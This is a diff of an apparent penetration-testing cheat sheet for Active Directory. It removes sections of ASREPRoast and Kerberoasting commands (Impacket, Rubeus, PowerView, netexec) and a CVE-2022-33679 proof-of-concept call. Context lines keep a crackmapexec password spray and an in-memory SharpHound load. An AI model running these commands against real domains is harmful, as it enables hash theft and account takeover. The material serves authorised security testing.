@@ -149,28 +149,7 @@ use auxiliary/scanner/smb/smb_login
 crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce
 ```
 
-### ASREPRoast
 
-#### Linux
-
-```bash
-impacket-GetNPUsers domain.com/ -request -format hashcat -dc-ip $ip -usersfile users.txt
-netexec ldap DCIP -u users -p '' --asreproast asrephashes.txt
-```
-#### Windows
-
-```powershell
-Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
-```
-
-#### ASREPRoast + CVE-2022-33679
-
-[CVE-2022-33679](https://github.com/Bdenneu/CVE-2022-33679)
-
-```bash
-python3 CVE-2022-33679.py domain.com/user <SERVER NAME>
-```
 
 
 ## Valid Credentials
@@ -212,19 +191,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 [Sharphound.Program]::Main("-d domain.com -c all".Split())
 ```
 
-### Kerberoasting
 
-```bash
-GetUserSPNs.py -request -dc-ip <DCIP> domain.com/username -outputfile hashes.kerberoast
-GetUserSPNs.py -request -dc-ip <DCIP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
-crackmapexec ldap $ip -u username -p 'password' -d domain.com --kerberoasting KERBEROASTING
-```
-
-#### Kerberoasting over ASREPROAST
-
-```bash
-GetUserSPNs.py -no-preauth <user asreproasting> -usersfile users -dc-host <IP DC> domain.com/
-```
 
 ### ADCS
 
